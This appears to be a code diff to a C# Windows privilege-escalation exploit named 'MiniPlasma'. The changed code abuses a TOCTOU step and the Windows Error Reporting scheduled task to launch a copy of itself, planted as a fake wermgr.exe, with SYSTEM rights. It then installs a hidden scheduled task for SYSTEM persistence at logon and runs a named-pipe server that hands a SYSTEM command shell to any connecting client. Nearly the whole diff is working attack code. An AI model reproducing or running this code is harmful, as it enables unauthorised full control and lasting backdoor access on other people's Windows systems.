@@ -25,6 +25,7 @@ using System.IO.Pipes;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Threading;
 using Microsoft.Win32;
 
@@ -228,7 +229,7 @@ if($r-eq 0){
 
     /* ── MiniPlasma ──────────────────────────────────────────────────────── */
 
-    static bool RunMiniPlasma(string syshostPath, string runDir)
+    static bool RunMiniPlasma(string runDir)
     {
         Console.WriteLine("[*] Stage 1: TOCTOU..."); Console.Write("    ");
         RunToctou();
@@ -265,9 +266,7 @@ if($r-eq 0){
         if (!wrote){Console.WriteLine("[-] windir write failed");return false;}
         Console.WriteLine($"[+] windir = {runDir}");
 
-        string sys32 = Path.Combine(runDir,"System32");
-        Directory.CreateDirectory(sys32);
-        File.Copy(syshostPath, Path.Combine(sys32,"wermgr.exe"), true);
+        PreparePayload(runDir); /* copy self as fake wermgr.exe */
 
         var psi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
             @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
@@ -283,28 +282,119 @@ if($r-eq 0){
         return true;
     }
 
-    /* ── Syshost extraction ──────────────────────────────────────────────── */
+    /* ── SYSTEM server mode (runs when easyplasma.exe is launched as SYSTEM via WER) ── */
 
-    static string ExtractSyshost()
+    static void RunServer()
     {
-        Directory.CreateDirectory(InstallDir);
-        string dest = Path.Combine(InstallDir,"syshost.exe");
-        var asm = Assembly.GetExecutingAssembly();
-        using(var s = asm.GetManifestResourceStream("syshost.exe")) {
-            if (s!=null) {
-                byte[] b = new byte[s.Length]; s.Read(b,0,b.Length);
-                File.WriteAllBytes(dest,b);
-                Console.WriteLine("[+] syshost extracted");
-                return dest;
-            }
+        /* Install persistence: scheduled task that auto-starts server on logon */
+        string selfPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+        string installDest = Path.Combine(InstallDir, "easyplasma.exe");
+        try {
+            Directory.CreateDirectory(InstallDir);
+            if (!string.Equals(selfPath, installDest, StringComparison.OrdinalIgnoreCase))
+                File.Copy(selfPath, installDest, true);
+            string taskCmd =
+                $"schtasks /create /f /tn \"\\EasyPlasma\\Maintenance\" " +
+                $"/tr \"\\\"{installDest}\\\" /server\" " +
+                $"/sc onlogon /ru SYSTEM /rl highest";
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
+                "cmd.exe", "/c " + taskCmd){CreateNoWindow=true, UseShellExecute=false})
+                ?.WaitForExit(5000);
+        } catch {}
+
+        /* Named pipe server loop */
+        for (;;) {
+            try {
+                var pipe = new NamedPipeServerStream(PipeName,
+                    PipeDirection.InOut, 10,
+                    PipeTransmissionMode.Byte, PipeOptions.None, 256, 256);
+                pipe.WaitForConnection();
+                new Thread(() => ServeClient(pipe)){IsBackground=true}.Start();
+            } catch { Thread.Sleep(1000); }
         }
-        /* Fallback: look next to exe */
-        string local = Path.Combine(
-            Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName),
-            "syshost.exe");
-        if (File.Exists(local)) { File.Copy(local,dest,true); return dest; }
-        Console.WriteLine("[-] syshost not found in resources or local dir");
-        return null;
+    }
+
+    static void ServeClient(NamedPipeServerStream pipe)
+    {
+        try {
+            /* Read client PID */
+            byte[] pidBuf = new byte[4];
+            pipe.Read(pidBuf, 0, 4);
+            int clientPid = BitConverter.ToInt32(pidBuf, 0);
+
+            /* Attach to client console and spawn SYSTEM cmd */
+            FreeConsole();
+            AttachConsole((uint)clientPid);
+
+            IntPtr hIn  = CreateFile("CONIN$",  0xC0000000, 3, IntPtr.Zero, 3, 0, IntPtr.Zero);
+            IntPtr hOut = CreateFile("CONOUT$", 0xC0000000, 3, IntPtr.Zero, 3, 0, IntPtr.Zero);
+
+            string initCmd =
+                "cmd.exe /K \"title [SYSTEM] Shell && prompt SYSTEM $P$G && " +
+                "doskey power=powershell.exe -NoLogo $* && " +
+                "doskey cmdnew=start cmd.exe && " +
+                "doskey psnew=start powershell.exe -NoLogo && " +
+                $"doskey unpriv=\\\"{Path.Combine(InstallDir,"easyplasma.exe")}\\\" --unpriv && " +
+                "echo. && echo  [SYSTEM] NT AUTHORITY\\SYSTEM && " +
+                "echo  power  cmdnew  psnew  unpriv && echo.\"";
+
+            var si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            si.dwFlags = 0x100; /* STARTF_USESTDHANDLES */
+            si.hStdInput  = hIn;
+            si.hStdOutput = hOut;
+            si.hStdError  = hOut;
+
+            var pi = new PROCESS_INFORMATION();
+            CreateProcess(null, initCmd, IntPtr.Zero, IntPtr.Zero, true, 0,
+                          IntPtr.Zero, null, ref si, out pi);
+
+            /* Signal client */
+            pipe.Write(new byte[]{79,75}, 0, 2); /* "OK" */
+            pipe.Flush();
+
+            if (pi.hProcess != IntPtr.Zero) {
+                WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+            }
+        } catch {}
+        finally { try { pipe.Dispose(); } catch {} }
+    }
+
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern bool FreeConsole();
+    [DllImport("kernel32.dll")] static extern bool AttachConsole(uint pid);
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+    static extern IntPtr CreateFile(string name, uint access, uint share,
+        IntPtr sa, uint create, uint flags, IntPtr template);
+    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    struct STARTUPINFO {
+        public int cb, _r1; public string _r2, _r3;
+        public int _r4, _r5, _r6, _r7, _r8, _r9, _r10; public uint dwFlags;
+        public short _r11, _r12; public IntPtr _r13;
+        public IntPtr hStdInput, hStdOutput, hStdError;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    struct PROCESS_INFORMATION {
+        public IntPtr hProcess, hThread; public int pid, tid;
+    }
+    [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
+    static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta,
+        bool inherit, uint flags, IntPtr env, string dir,
+        ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+
+    /* Prepare fake wermgr.exe path — just copy ourselves there */
+    static string PreparePayload(string runDir)
+    {
+        string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+        string sys32 = Path.Combine(runDir, "System32");
+        Directory.CreateDirectory(sys32);
+        string dest = Path.Combine(sys32, "wermgr.exe");
+        File.Copy(self, dest, true);
+        return dest;
     }
 
     /* ── Fast path: connect to running pipe server ───────────────────────── */
@@ -429,7 +519,14 @@ if($r-eq 0){
 
     static void Main(string[] args)
     {
+        /* If running as SYSTEM (launched by WER as fake wermgr.exe): run pipe server */
+        if (WindowsIdentity.GetCurrent().IsSystem) {
+            RunServer();
+            return;
+        }
+
         string mode = args.Length>0 ? args[0].ToLower() : "";
+        if (mode=="/server")  { RunServer(); return; } /* scheduled task path */
         if (mode=="install")  { Install();   return; }
         if (mode=="update")   { Update();    return; }
         if (mode=="--unpriv"||mode=="unpriv") { Uninstall(); return; }
@@ -448,21 +545,14 @@ if($r-eq 0){
         }
         Console.WriteLine("[*] No existing session. Running full escalation...\n");
 
-        /* Extract syshost from embedded resources */
-        string syshostPath = ExtractSyshost();
-        if (syshostPath==null) return;
-
         string id = Guid.NewGuid().ToString("N").Substring(0,8);
         string runDir = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
             "mp_"+id);
         Directory.CreateDirectory(runDir);
 
-        /* Write config for syshost: install dir so it can persist itself */
-        File.WriteAllText(CfgPath, InstallDir);
-
-        /* Run MiniPlasma */
-        if (!RunMiniPlasma(syshostPath, runDir)) {
+        /* Run MiniPlasma (drops copy of self as fake wermgr.exe) */
+        if (!RunMiniPlasma(runDir)) {
             try{File.Delete(CfgPath);}catch{}
             return;
         }
